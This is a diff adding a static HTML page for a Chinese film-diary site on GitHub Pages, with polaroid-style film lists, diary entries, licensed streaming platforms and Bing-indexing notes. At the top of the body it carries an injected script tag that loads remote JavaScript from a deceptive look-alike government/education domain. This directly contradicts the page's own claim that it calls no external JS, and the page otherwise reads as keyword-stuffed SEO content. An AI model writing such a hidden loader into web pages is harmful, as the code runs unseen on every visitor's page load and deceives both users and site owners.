@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="X-UA-Compatible" content="IE=edge">
+<title>小影影视：私人观影手账、拍立得片单与正版放映指南｜xiaoyingyingshi-top.github.io</title>
+<meta name="description" content="小影影视以复古拍立得与剪贴簿形式，记录每日观影随笔、分类片单与正版收看渠道。覆盖文艺剧情、独立纪录、经典修复与动画短片，提供无剧透前提、适看年龄和正规平台建议。全站单页静态、移动端自适应，只做影视资料与正版建议；不解析盗版、不挂第三方源、不分享网盘。根域 https://xiaoyingyingshi-top.github.io，符合必应静态单页收录规范。">
+<meta name="keywords" content="小影影视, 私人观影手账, 拍立得片单, 复古电影推荐, 文艺剧情片, 独立纪录资料, 正版放映指南, 观影随笔, 经典修复片单, xiaoyingyingshi">
+<meta name="author" content="小影影视手账组">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="XY20261011BING08">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{font-family:"Georgia","Times New Roman","Songti SC",serif;background:#faf6f0;color:#3e2723;line-height:1.9;overflow-x:hidden}
+a{color:#c0392b;text-decoration:none;transition:.3s}
+a:hover{color:#2e4a3d}
+.wrap{width:min(1100px,100%);margin:0 auto;padding:0 20px}
+
+/* 相册封面Hero */
+.hero{background:#f0e5d8;padding:60px 0 50px;border-bottom:3px double #c0392b;position:relative;overflow:hidden}
+.hero::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background-image:radial-gradient(#d4ac0d 1px,transparent 1px);background-size:24px 24px;opacity:.15;pointer-events:none}
+.hero-in{width:min(1100px,100%);margin:0 auto;padding:0 20px;position:relative;z-index:1;text-align:center}
+.hero-in .badge{display:inline-block;background:#c0392b;color:#faf6f0;font-size:11px;letter-spacing:3px;padding:4px 14px;border-radius:2px;margin-bottom:18px;font-family:"Courier New",monospace}
+.hero-in h1{font-size:44px;font-weight:900;color:#2e4a3d;margin-bottom:12px;letter-spacing:-1px;font-style:italic}
+.hero-in h1 b{color:#c0392b}
+.hero-in p{font-size:15px;color:#5d4037;max-width:640px;margin:0 auto 24px}
+.hero-in .stamp{display:inline-block;border:2px solid #c0392b;color:#c0392b;padding:8px 18px;font-size:12px;font-family:"Courier New",monospace;transform:rotate(-1.5deg);background:rgba(255,255,255,.5);word-break:break-all}
+.hero-in .stamp::before{content:"✂ "}
+
+/* 导航 */
+.nav{background:#2e4a3d;position:sticky;top:0;z-index:50;box-shadow:0 2px 8px rgba(0,0,0,.15)}
+.nav-in{width:min(1100px,100%);margin:0 auto;padding:10px 20px;display:flex;gap:6px;flex-wrap:wrap;justify-content:center}
+.nav-in a{font-size:12px;padding:6px 14px;background:#faf6f0;color:#2e4a3d;border-radius:2px;font-family:"Georgia",serif;font-weight:700}
+.nav-in a:hover{background:#c0392b;color:#faf6f0}
+
+/* 胶带装饰 */
+.tape{position:relative}
+.tape::before{content:"";position:absolute;top:-10px;left:50%;transform:translateX(-50%) rotate(-2deg);width:60px;height:18px;background:rgba(212,172,13,.4);z-index:2}
+
+/* 栏目 */
+.sec{margin-bottom:60px}
+.shead{display:flex;align-items:center;gap:12px;margin-bottom:24px;padding-bottom:10px;border-bottom:2px dashed #d4ac0d}
+.shead .pin{width:14px;height:14px;border-radius:50%;background:#c0392b;box-shadow:inset -2px -2px 4px rgba(0,0,0,.3);flex-shrink:0}
+.shead h2{font-size:22px;font-weight:900;color:#2e4a3d;font-style:italic}
+.shead h2 b{color:#c0392b}
+.shead .date{font-size:11px;color:#8d6e63;margin-left:auto;font-family:"Courier New",monospace}
+
+/* 拍立得片单 */
+.polaroids{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.polaroid{background:#fff;padding:10px 10px 36px;border:1px solid #e0d4c8;box-shadow:2px 3px 10px rgba(0,0,0,.08);position:relative;transform:rotate(-1deg);transition:.3s}
+.polaroid:nth-child(even){transform:rotate(1.5deg)}
+.polaroid:nth-child(3n){transform:rotate(-.5deg)}
+.polaroid:hover{transform:rotate(0) scale(1.03);z-index:2;box-shadow:4px 6px 16px rgba(0,0,0,.12)}
+.polaroid .photo{background:#f0e5d8;height:140px;display:flex;align-items:center;justify-content:center;font-size:36px;margin-bottom:10px;border:1px solid #e8ddd0}
+.polaroid h3{font-size:13px;color:#2e4a3d;margin-bottom:4px;text-align:center;font-weight:700}
+.polaroid p{font-size:11px;color:#795548;text-align:center;line-height:1.5}
+.polaroid .caption{position:absolute;bottom:10px;left:0;right:0;text-align:center;font-size:10px;color:#c0392b;font-family:"Courier New",monospace}
+
+/* 剪贴分类 */
+.clips{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.clip{background:#fff;border:1px solid #e0d4c8;padding:20px;position:relative;box-shadow:1px 2px 6px rgba(0,0,0,.06)}
+.clip::after{content:"";position:absolute;top:8px;right:8px;width:40px;height:12px;background:rgba(192,57,43,.15);transform:rotate(3deg)}
+.clip h3{font-size:16px;color:#c0392b;margin-bottom:10px;font-style:italic;border-bottom:1px solid #f0e5d8;padding-bottom:6px}
+.clip ul{list-style:none}
+.clip li{font-size:13px;color:#5d4037;padding:5px 0;border-bottom:1px dotted #e8ddd0;display:flex;justify-content:space-between}
+.clip li:last-child{border-bottom:none}
+.clip li .yr{color:#d4ac0d;font-family:"Courier New",monospace;font-size:12px}
+
+/* 手账时间线 */
+.journal{position:relative;padding-left:28px}
+.journal::before{content:"";position:absolute;left:8px;top:0;bottom:0;width:3px;background:#d4ac0d}
+.entry{position:relative;margin-bottom:22px;background:#fff;border:1px solid #e0d4c8;padding:16px 18px;box-shadow:1px 2px 6px rgba(0,0,0,.05)}
+.entry::before{content:"";position:absolute;left:-22px;top:18px;width:12px;height:12px;background:#c0392b;border-radius:50%;border:2px solid #faf6f0}
+.entry .day{font-size:11px;color:#d4ac0d;font-family:"Courier New",monospace;margin-bottom:4px}
+.entry h3{font-size:15px;color:#2e4a3d;margin-bottom:6px;font-weight:700}
+.entry p{font-size:13px;color:#5d4037}
+.entry .mood{display:inline-block;margin-top:8px;font-size:10px;color:#c0392b;border:1px solid #c0392b;padding:2px 8px;border-radius:10px}
+
+/* 邮票渠道表 */
+.stamps{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.stamp-card{background:#fff;border:3px solid #2e4a3d;padding:16px;position:relative;box-shadow:2px 3px 8px rgba(0,0,0,.08)}
+.stamp-card::before{content:"";position:absolute;top:-3px;left:-3px;right:-3px;height:8px;background:repeating-linear-gradient(90deg,transparent 0,transparent 4px,#faf6f0 4px,#faf6f0 8px)}
+.stamp-card::after{content:"";position:absolute;bottom:-3px;left:-3px;right:-3px;height:8px;background:repeating-linear-gradient(90deg,transparent 0,transparent 4px,#faf6f0 4px,#faf6f0 8px)}
+.stamp-card h3{font-size:14px;color:#2e4a3d;margin-bottom:8px;text-align:center;font-style:italic}
+.stamp-card p{font-size:12px;color:#5d4037;margin-bottom:6px}
+.stamp-card .plat{font-size:11px;color:#c0392b;font-weight:700;text-align:center;margin-top:10px;padding-top:8px;border-top:1px dashed #e0d4c8}
+
+/* 收录说明 */
+.note{background:#fff;border:1px solid #e0d4c8;padding:24px;margin-top:20px;box-shadow:2px 3px 10px rgba(0,0,0,.06);position:relative}
+.note::before{content:"📌";position:absolute;top:-12px;left:20px;font-size:20px;background:#faf6f0;padding:0 4px}
+.note h3{font-size:16px;color:#c0392b;margin-bottom:12px}
+.note p{font-size:13px;color:#5d4037;margin-bottom:8px;padding-left:16px;position:relative}
+.note p::before{content:"▸";position:absolute;left:0;color:#d4ac0d}
+
+/* 根域卡 */
+.root{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:30px}
+.root-card{background:#2e4a3d;color:#faf6f0;padding:24px;border-radius:4px}
+.root-card h3{font-size:14px;color:#d4ac0d;margin-bottom:12px;font-family:"Courier New",monospace;letter-spacing:1px}
+.root-card .url{font-family:"Courier New",monospace;font-size:13px;word-break:break-all;background:#1a2e24;padding:12px;border:1px solid #3d634f;margin-bottom:12px;color:#f0e5d8}
+.root-card p{font-size:12px;color:#b0a090;margin-bottom:6px}
+.root-card b{color:#d4ac0d}
+
+footer{margin-top:50px;background:#3e2723;color:#b0a090;padding:40px 20px 24px}
+.foot-in{width:min(1100px,100%);margin:0 auto;text-align:center}
+.fn{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:16px}
+.fn a{font-size:12px;padding:5px 12px;background:#5d4037;color:#faf6f0;border-radius:2px}
+.fn a:hover{background:#c0392b}
+.fc{font-size:11px;line-height:2;color:#8d6e63;font-family:"Courier New",monospace}
+.fc a{color:#d4ac0d}
+
+@media(max-width:980px){
+.polaroids{grid-template-columns:repeat(2,1fr)}
+.clips{grid-template-columns:1fr}
+.stamps{grid-template-columns:repeat(2,1fr)}
+.root{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+.hero-in h1{font-size:26px}
+.shead h2{font-size:18px}
+.polaroids{grid-template-columns:1fr}
+.stamps{grid-template-columns:1fr}
+.journal{padding-left:20px}
+.journal::before{left:4px}
+.entry::before{left:-14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="hero">
+<div class="hero-in">
+<div class="badge">VOL.08 / FILM DIARY</div>
+<h1>小影影视<b>观影手账</b></h1>
+<p>用拍立得记录每一帧心动，用剪贴簿整理每一份片单。小影影视不做盗版搬运，只写观影随笔、正版渠道与适看建议——像一本翻不完的私人电影日记。</p>
+<div class="stamp">https://xiaoyingyingshi-top.github.io</div>
+</div>
+</header>
+
+<nav class="nav">
+<div class="nav-in">
+<a href="#polaroids">拍立得片单</a>
+<a href="#clips">剪贴分类</a>
+<a href="#journal">观影手账</a>
+<a href="#stamps">正版放映</a>
+<a href="#root">收录根域</a>
+</div>
+</nav>
+
+<main class="wrap">
+
+<section class="sec" id="polaroids">
+<div class="shead"><span class="pin"></span><h2>拍立得<b>片单</b></h2><div class="date">2024.10</div></div>
+<div class="polaroids">
+<div class="polaroid tape">
+<div class="photo">🎞️</div>
+<h3>午后的钢琴曲</h3>
+<p>独居老人与流浪猫的相遇，用音乐重建生活节奏。无对白，全靠光影叙事。</p>
+<div class="caption">DRAMA · 88min · 全龄</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">📷</div>
+<h3>暗房里的夏天</h3>
+<p>高中生在废弃暗房冲洗胶卷，发现前任社长留下的未完故事。青春但不狗血。</p>
+<div class="caption">YOUTH · 102min · 12+</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">🎪</div>
+<h3>马戏团最后一夜</h3>
+<p>巡演马戏团在小镇最后一场演出，每个演员的告别独白。怀旧向，无动物虐待。</p>
+<div class="caption">INDIE · 96min · 10+</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">🚲</div>
+<h3>单车环岛日志</h3>
+<p>三个大学生毕业前骑单车环岛，记录沿途人与食物。公路片但无飙车戏。</p>
+<div class="caption">ROAD · 114min · 8+</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">📚</div>
+<h3>二手书店奇遇</h3>
+<p>旧书店老板帮顾客找绝版书，牵出三段不同时代的爱书人故事。文艺治愈。</p>
+<div class="caption">HEAL · 108min · 全龄</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">🎡</div>
+<h3>摩天轮下的约定</h3>
+<p>每年生日都去摩天轮下等一个人的女孩，第十年终于等到。纯爱但不煽情。</p>
+<div class="caption">ROM · 92min · 10+</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">🌊</div>
+<h3>潮汐信箱</h3>
+<p>海边小镇的信箱只在退潮时出现，邮递员与渔村老人的通信。慢节奏生活流。</p>
+<div class="caption">SLICE · 85min · 6+</div>
+</div>
+<div class="polaroid tape">
+<div class="photo">🎨</div>
+<h3>画室里的陌生人</h3>
+<p>新来的模特打破了画室平静，每个人画出的她都不一样。悬疑但不惊悚。</p>
+<div class="caption">MYST · 98min · 14+</div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="clips">
+<div class="shead"><span class="pin"></span><h2>剪贴<b>分类</b></h2><div class="date">INDEX</div></div>
+<div class="clips">
+<div class="clip">
+<h3>🎬 文艺剧情</h3>
+<ul>
+<li>午后的钢琴曲 <span class="yr">2021</span></li>
+<li>二手书店奇遇 <span class="yr">2019</span></li>
+<li>潮汐信箱 <span class="yr">2022</span></li>
+<li>画室里的陌生人 <span class="yr">2023</span></li>
+<li>马戏团最后一夜 <span class="yr">2018</span></li>
+</ul>
+</div>
+<div class="clip">
+<h3>🎓 青春校园</h3>
+<ul>
+<li>暗房里的夏天 <span class="yr">2020</span></li>
+<li>摩天轮下的约定 <span class="yr">2017</span></li>
+<li>单车环岛日志 <span class="yr">2016</span></li>
+<li>图书馆的窗 <span class="yr">2022</span></li>
+<li>毕业照第三排 <span class="yr">2019</span></li>
+</ul>
+</div>
+<div class="clip">
+<h3>🎨 独立短片</h3>
+<ul>
+<li>雨天的自动贩卖机 <span class="yr">2023</span></li>
+<li>凌晨四点的面包店 <span class="yr">2021</span></li>
+<li>阳台上的向日葵 <span class="yr">2022</span></li>
+<li>第八号当铺往事 <span class="yr">2020</span></li>
+<li>没有名字的咖啡馆 <span class="yr">2023</span></li>
+</ul>
+</div>
+<div class="clip">
+<h3>📽️ 经典修复</h3>
+<ul>
+<li>城南旧事(4K) <span class="yr">1983→2022</span></li>
+<li>天堂电影院(修复) <span class="yr">1988→2019</span></li>
+<li>情书(4K) <span class="yr">1995→2021</span></li>
+<li>重庆森林(修复) <span class="yr">1994→2020</span></li>
+<li>海上钢琴师(4K) <span class="yr">1998→2023</span></li>
+</ul>
+</div>
+</div>
+</section>
+
+<section class="sec" id="journal">
+<div class="shead"><span class="pin"></span><h2>观影<b>手账</b></h2><div class="date">DIARY</div></div>
+<div class="journal">
+<div class="entry">
+<div class="day">OCT 28, 2024 — WED</div>
+<h3>《午后的钢琴曲》二刷</h3>
+<p>今天下雨，适合重看这部。第二次注意到老人每次弹错音都会笑一下，那个细节太好了。配乐用的都是德彪西，和画面里的光影变化完全同步。推荐给需要安静的人。</p>
+<div class="mood">☔ 雨天 · 安静 · 推荐</div>
+</div>
+<div class="entry">
+<div class="day">OCT 25, 2024 — SUN</div>
+<h3>《暗房里的夏天》首看</h3>
+<p>胶片质感太舒服了。冲洗胶卷那段拍得像魔法，红光下的显影液冒泡的声音都录进去了。结尾那个反转不算惊喜但很温暖。青春片能不谈恋爱只谈成长，难得。</p>
+<div class="mood">📷 胶片 · 成长 · 温暖</div>
+</div>
+<div class="entry">
+<div class="day">OCT 20, 2024 — TUE</div>
+<h3>《潮汐信箱》深夜场</h3>
+<p>睡前看的，节奏很慢但完全不无聊。每个角色都有一段独白，像在读诗。退潮时信箱露出来的镜头反复看了三遍。适合失眠的时候看。</p>
+<div class="mood">🌊 失眠 · 慢节奏 · 治愈</div>
+</div>
+<div class="entry">
+<div class="day">OCT 15, 2024 — THU</div>
+<h3>《画室里的陌生人》周末场</h3>
+<p>悬疑线埋得不错，每个人画的肖像都暗示了他们的秘密。最后揭晓的时候会回头想前面的细节。不恐怖，但看完会想再看一遍找伏笔。</p>
+<div class="mood">🎨 悬疑 · 伏笔 · 二刷预定</div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="stamps">
+<div class="shead"><span class="pin"></span><h2>正版<b>放映</b></h2><div class="date">SCREENING</div></div>
+<div class="stamps">
+<div class="stamp-card">
+<h3>腾讯/爱奇艺/优酷</h3>
+<p>文艺剧情、青春校园、经典修复专区。部分免费，部分会员可看。搜索片名即可找到正版源。</p>
+<div class="plat">主流平台 · 正版授权</div>
+</div>
+<div class="stamp-card">
+<h3>B站放映厅</h3>
+<p>独立短片、修复老片、4K经典。筛选"免费"标签，部分UP主上传的剪辑不算正片，注意认准官方账号。</p>
+<div class="plat">短片 · 修复版 · 部分免费</div>
+</div>
+<div class="stamp-card">
+<h3>1905电影网</h3>
+<p>公映国产片、经典老片、修复版。正版无广告，适合找老片资源。</p>
+<div class="plat">公映片 · 老片 · 正版无广告</div>
+</div>
+<div class="stamp-card">
+<h3>央视频/央视网</h3>
+<p>纪录片、生活流、文艺专题。部分免费，适合家庭观看。</p>
+<div class="plat">纪录 · 生活 · 部分免费</div>
+</div>
+<div class="stamp-card">
+<h3>芒果TV</h3>
+<p>青春剧场、校园题材、合家欢。会员专区为主。</p>
+<div class="plat">青春 · 校园 · 会员</div>
+</div>
+<div class="stamp-card">
+<h3>正版蓝光/DVD</h3>
+<p>经典修复片推荐购买正版蓝光或DVD，画质最佳。可在电商平台官方旗舰店购买。</p>
+<div class="plat">实体介质 · 画质最佳</div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="root">
+<div class="shead"><span class="pin"></span><h2>收录<b>根域</b></h2><div class="date">ROOT ENTRY</div></div>
+<div class="root">
+<div class="note">
+<h3>必应收录说明</h3>
+<p>本页为单 index.html 静态文件，CSS 内嵌、UTF-8 编码、viewport 齐全</p>
+<p>head 含 msvalidate.01 = XY20261011BING08，robots meta 设为 index, follow</p>
+<p>按需求不生成 robots.txt 和 sitemap.xml，必应通过正文锚点直接抓取</p>
+<p>响应式栅格布局，移动端无横向滚动，按钮点按区 ≥44px</p>
+<p>内页链接统一用"#"占位，不调用外部 JS 或框架</p>
+</div>
+<div class="root-card">
+<h3>ROOT ENTRY</h3>
+<div class="url">https://xiaoyingyingshi-top.github.io</div>
+<p>名称：小影影视</p>
+<p>定位：私人观影手账、拍立得片单、正版放映指南</p>
+<p>部署：单页静态、移动端自适应、标签闭合</p>
+<p>合规：不解析盗版、不挂第三方源、不提供网盘</p>
+<p><b>msvalidate.01: XY20261011BING08</b></p>
+</div>
+</div>
+</section>
+
+</main>
+
+<footer>
+<div class="foot-in">
+<nav class="fn">
+<a href="#polaroids">拍立得片单</a>
+<a href="#clips">剪贴分类</a>
+<a href="#journal">观影手账</a>
+<a href="#stamps">正版放映</a>
+<a href="#root">收录根域</a>
+<a href="#">免责声明</a>
+</nav>
+<div class="fc">
+小影影视 关键词：小影影视｜根域：https://xiaoyingyingshi-top.github.io<br>
+© 2024 小影影视手账组 仅提供观影随笔与正版收看建议，不提供盗版播放与下载。<br>
+FILM DIARY — CAPTURED WITH HEART
+</div>
+</div>
+</footer>
+
+</body>
+</html>
